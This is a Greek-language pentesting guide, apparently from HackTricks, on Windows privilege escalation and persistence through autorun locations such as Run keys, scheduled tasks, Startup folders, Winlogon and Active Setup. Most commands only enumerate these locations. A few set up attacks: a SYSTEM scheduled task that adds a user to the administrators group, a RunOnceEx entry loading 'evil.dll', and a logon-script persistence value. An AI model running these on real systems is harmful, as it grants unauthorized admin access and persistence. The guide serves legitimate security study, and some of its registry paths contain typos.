# Κλιμάκωση προνομίων με Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

Το **Wmic** μπορεί να χρησιμοποιηθεί για την εκτέλεση προγραμμάτων κατά την **εκκίνηση**. Δείτε ποια δυαδικά αρχεία έχουν προγραμματιστεί να εκτελούνται κατά την εκκίνηση με:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Προγραμματισμένες εργασίες

Οι **Εργασίες** μπορούν να προγραμματιστούν ώστε να εκτελούνται με **συγκεκριμένη συχνότητα**. Δείτε ποια binaries έχουν προγραμματιστεί να εκτελούνται με:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Φάκελοι

Όλα τα binaries που βρίσκονται στους **φακέλους Startup εκτελούνται κατά την εκκίνηση**. Οι συνηθισμένοι φάκελοι Startup είναι αυτοί που παρατίθενται παρακάτω, αλλά ο φάκελος Startup καθορίζεται στο registry. [Διαβάστε εδώ για να μάθετε πού.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Τα vulnerabilities τύπου *path traversal* κατά την εξαγωγή αρχείων (όπως αυτό που έγινε exploited στο WinRAR πριν από την έκδοση 7.13 – CVE-2025-8088) μπορούν να αξιοποιηθούν για **την απευθείας τοποθέτηση payloads μέσα σε αυτούς τους Startup folders κατά την αποσυμπίεση**, με αποτέλεσμα την εκτέλεση κώδικα στο επόμενο user logon.  Για μια λεπτομερή ανάλυση αυτής της τεχνικής, δείτε:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Σημείωση από εδώ](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Η καταχώρηση **Wow6432Node** στο registry υποδεικνύει ότι εκτελείτε Windows έκδοσης 64-bit. Το λειτουργικό σύστημα χρησιμοποιεί αυτό το key για να εμφανίζει ξεχωριστή προβολή του HKEY_LOCAL_MACHINE\SOFTWARE για εφαρμογές 32-bit που εκτελούνται σε εκδόσεις Windows 64-bit.

### Runs

**Γνωστά** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Τα registry keys που είναι γνωστά ως **Run** και **RunOnce** έχουν σχεδιαστεί ώστε να εκτελούν αυτόματα προγράμματα κάθε φορά που ένας user κάνει log into στο σύστημα. Η command line που έχει εκχωρηθεί ως data value ενός key περιορίζεται σε 260 χαρακτήρες ή λιγότερους.<sup>[[2]](#references)</sup>

**Service runs** (μπορούν να ελέγχουν το automatic startup των services κατά το boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Στα Windows Vista και σε μεταγενέστερες εκδόσεις, τα registry keys **Run** και **RunOnce** δεν δημιουργούνται αυτόματα. Οι entries σε αυτά τα keys μπορούν είτε να εκκινούν απευθείας προγράμματα είτε να τα καθορίζουν ως dependencies. Για παράδειγμα, για τη φόρτωση ενός αρχείου DLL κατά το logon, θα μπορούσε να χρησιμοποιηθεί το registry key **RunOnceEx** μαζί με ένα key "Depend". Αυτό παρουσιάζεται με την προσθήκη ενός registry entry για την εκτέλεση του "C:\temp\evil.dll" κατά το system start-up:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Αν μπορείτε να κάνετε write σε οποιοδήποτε από τα προαναφερθέντα registry μέσα στο **HKLM**, μπορείτε να κάνετε privilege escalation όταν συνδεθεί ένας διαφορετικός χρήστης.

> [!TIP]
> **Exploit 2**: Αν μπορείτε να κάνετε overwrite οποιοδήποτε από τα binaries που υποδεικνύονται σε οποιοδήποτε registry μέσα στο **HKLM**, μπορείτε να τροποποιήσετε αυτό το binary με ένα backdoor όταν συνδεθεί ένας διαφορετικός χρήστης και να κάνετε privilege escalation.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Διαδρομή Startup

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Οι συντομεύσεις που τοποθετούνται στον φάκελο **Startup** θα ενεργοποιούν αυτόματα την εκκίνηση services ή applications κατά το user logon ή την επανεκκίνηση του συστήματος. Η τοποθεσία του φακέλου **Startup** ορίζεται στο registry τόσο για το scope **Local Machine** όσο και για το scope **Current User**. Αυτό σημαίνει ότι οποιαδήποτε συντόμευση προστεθεί σε αυτές τις καθορισμένες τοποθεσίες **Startup** θα διασφαλίζει ότι το συνδεδεμένο service ή πρόγραμμα θα εκκινεί μετά τη διαδικασία logon ή reboot, αποτελώντας μια απλή μέθοδο για τον προγραμματισμό της αυτόματης εκτέλεσης προγραμμάτων.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Αν μπορείς να κάνεις overwrite οποιουδήποτε \[User] Shell Folder κάτω από το **HKLM**, θα μπορείς να το κατευθύνεις σε έναν φάκελο που ελέγχεις και να τοποθετήσεις ένα backdoor που θα εκτελείται κάθε φορά που ένας user κάνει log in στο σύστημα, πραγματοποιώντας privilege escalation.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Αυτή η τιμή μητρώου ανά χρήστη μπορεί να δείχνει σε ένα script ή command που εκτελείται όταν ο συγκεκριμένος χρήστης κάνει log on. Αποτελεί κυρίως primitive για **persistence**, επειδή εκτελείται μόνο στο context του επηρεαζόμενου χρήστη, αλλά αξίζει να ελέγχεται κατά τις αξιολογήσεις post-exploitation και autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Αν μπορείτε να γράψετε σε αυτή την τιμή για τον τρέχοντα χρήστη, μπορείτε να επανενεργοποιήσετε την εκτέλεση στο επόμενο interactive logon χωρίς να χρειάζεστε admin rights. Αν μπορείτε να γράψετε στο hive ενός άλλου χρήστη, ενδέχεται να αποκτήσετε code execution όταν αυτός ο χρήστης κάνει log on.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Σημειώσεις:

- Προτιμήστε πλήρεις διαδρομές προς αρχεία `.bat`, `.cmd`, `.ps1` ή άλλα αρχεία launcher που είναι ήδη αναγνώσιμα από τον χρήστη-στόχο.
- Αυτό παραμένει ενεργό μετά από αποσύνδεση/επανεκκίνηση, έως ότου καταργηθεί η τιμή.
- Σε αντίθεση με το `HKLM\...\Run`, αυτό **δεν** παρέχει elevation από μόνο του· αποτελεί persistence σε επίπεδο χρήστη.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Συνήθως, το **Userinit** key έχει οριστεί σε **userinit.exe**. Ωστόσο, αν τροποποιηθεί αυτό το key, το καθορισμένο executable θα εκκινηθεί επίσης από το **Winlogon** κατά το user logon. Παρομοίως, το **Shell** key προορίζεται να δείχνει στο **explorer.exe**, το οποίο είναι το προεπιλεγμένο shell των Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Εάν μπορείτε να αντικαταστήσετε την τιμή του registry ή το binary, θα μπορέσετε να κάνετε privilege escalation.

### Ρυθμίσεις πολιτικής

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Ελέγξτε το key **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Αλλαγή της γραμμής εντολών σε Safe Mode

Στο Windows Registry, στη θέση `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, υπάρχει μια τιμή **`AlternateShell`** που από προεπιλογή έχει οριστεί σε `cmd.exe`. Αυτό σημαίνει ότι όταν επιλέγετε "Safe Mode with Command Prompt" κατά την εκκίνηση (πατώντας F8), χρησιμοποιείται το `cmd.exe`. Ωστόσο, είναι δυνατό να ρυθμίσετε τον υπολογιστή ώστε να ξεκινά αυτόματα σε αυτή τη λειτουργία, χωρίς να χρειάζεται να πατήσετε F8 και να την επιλέξετε χειροκίνητα.

Βήματα για τη δημιουργία μιας επιλογής εκκίνησης που ξεκινά αυτόματα σε "Safe Mode with Command Prompt":<sup>[[5]](#references)</sup>

1. Αλλάξτε τα attributes του αρχείου `boot.ini` για να αφαιρέσετε τα flags read-only, system και hidden: `attrib c:\boot.ini -r -s -h`
2. Ανοίξτε το `boot.ini` για επεξεργασία.
3. Εισαγάγετε μια γραμμή όπως: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Αποθηκεύστε τις αλλαγές στο `boot.ini`.
5. Επαναφέρετε τα αρχικά attributes του αρχείου: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Η αλλαγή του **AlternateShell** registry key επιτρέπει τη ρύθμιση custom command shell, ενδεχομένως για unauthorized access.
- **Exploit 2 (PATH Write Permissions):** Η ύπαρξη write permissions σε οποιοδήποτε τμήμα της μεταβλητής **PATH** του συστήματος, ιδιαίτερα πριν από το `C:\Windows\system32`, επιτρέπει την εκτέλεση ενός custom `cmd.exe`, το οποίο θα μπορούσε να λειτουργήσει ως backdoor αν το σύστημα ξεκινήσει σε Safe Mode.
- **Exploit 3 (PATH και boot.ini Write Permissions):** Η δυνατότητα εγγραφής στο `boot.ini` επιτρέπει την αυτόματη εκκίνηση σε Safe Mode, διευκολύνοντας το unauthorized access στην επόμενη επανεκκίνηση.

Για να ελέγξετε την τρέχουσα ρύθμιση του **AlternateShell**, χρησιμοποιήστε τις εξής εντολές:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Εγκατεστημένο Component

Το Active Setup είναι μια δυνατότητα των Windows που **ξεκινά πριν φορτωθεί πλήρως το desktop environment**. Δίνει προτεραιότητα στην εκτέλεση συγκεκριμένων commands, τα οποία πρέπει να ολοκληρωθούν πριν συνεχιστεί το user logon. Αυτή η διαδικασία πραγματοποιείται ακόμη και πριν ενεργοποιηθούν άλλα startup entries, όπως εκείνα στις ενότητες Run ή RunOnce του registry.

Το Active Setup διαχειρίζεται μέσω των ακόλουθων registry keys:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Μέσα σε αυτά τα keys υπάρχουν διάφορα subkeys, καθένα από τα οποία αντιστοιχεί σε ένα συγκεκριμένο component. Οι βασικές τιμές που παρουσιάζουν ενδιαφέρον περιλαμβάνουν:

- **IsInstalled:**
- `0` υποδεικνύει ότι το command του component δεν θα εκτελεστεί.
- `1` σημαίνει ότι το command θα εκτελεστεί μία φορά για κάθε user, αυτή είναι και η προεπιλεγμένη συμπεριφορά όταν λείπει η τιμή `IsInstalled`.
- **StubPath:** Καθορίζει το command που θα εκτελεστεί από το Active Setup. Μπορεί να είναι οποιαδήποτε έγκυρη command line, όπως η εκκίνηση του `notepad`.

**Security Insights:**

- Η τροποποίηση ή η εγγραφή σε ένα key όπου το **`IsInstalled`** έχει οριστεί σε `"1"` με συγκεκριμένο **`StubPath`** μπορεί να οδηγήσει σε μη εξουσιοδοτημένο command execution, ενδεχομένως για privilege escalation.
- Η τροποποίηση του binary file που αναφέρεται σε οποιαδήποτε τιμή **`StubPath`** θα μπορούσε επίσης να επιτύχει privilege escalation, εφόσον υπάρχουν επαρκή permissions.

Για την επιθεώρηση των ρυθμίσεων **`StubPath`** σε όλα τα Active Setup components, μπορούν να χρησιμοποιηθούν τα εξής commands:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Επισκόπηση των Browser Helper Objects (BHOs)

Τα Browser Helper Objects (BHOs) είναι modules DLL που προσθέτουν επιπλέον δυνατότητες στον Microsoft Internet Explorer. Φορτώνονται στον Internet Explorer και το Windows Explorer σε κάθε εκκίνηση. Ωστόσο, η εκτέλεσή τους μπορεί να αποκλειστεί ορίζοντας το key **NoExplorer** σε 1, αποτρέποντας τη φόρτωσή τους μαζί με instances του Windows Explorer.<sup>[[1]](#references)</sup>

Τα BHOs είναι συμβατά με τα Windows 10 μέσω του Internet Explorer 11, αλλά δεν υποστηρίζονται στον Microsoft Edge, τον default browser στις νεότερες εκδόσεις των Windows.

Για να εξετάσετε τα BHOs που είναι registered σε ένα σύστημα, μπορείτε να ελέγξετε τα ακόλουθα registry keys:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Κάθε BHO αναπαρίσταται από το **CLSID** του στο registry, το οποίο λειτουργεί ως unique identifier. Λεπτομερείς πληροφορίες για κάθε CLSID μπορούν να βρεθούν στο `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Για την αναζήτηση BHOs στο registry, μπορούν να χρησιμοποιηθούν οι ακόλουθες εντολές:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Επεκτάσεις Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Σημειώστε ότι το registry θα περιέχει 1 νέα καταχώριση registry για κάθε dll και θα αναπαρίσταται από το **CLSID**. Μπορείτε να βρείτε τις πληροφορίες του CLSID στο `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Εντολή ανοίγματος

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Σημειώστε ότι όλες οι τοποθεσίες όπου μπορείτε να βρείτε autoruns έχουν **ήδη αναζητηθεί από το**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Ωστόσο, για μια **πιο ολοκληρωμένη λίστα αρχείων που εκτελούνται αυτόματα**, μπορείτε να χρησιμοποιήσετε το [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)από το systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Περισσότερα

**Βρείτε περισσότερα Autoruns όπως τα registries στο** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## Αναφορές

- [1] [Συνήθεις μηχανισμοί persistence malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart categories (Troubleshooting with the Windows Sysinternals Tools, 2nd Edition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Πώς μπορώ να προσθέσω μια boot option που εκκινεί ένα alternate shell;](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)

{{#include ../../banners/hacktricks-training.md}}
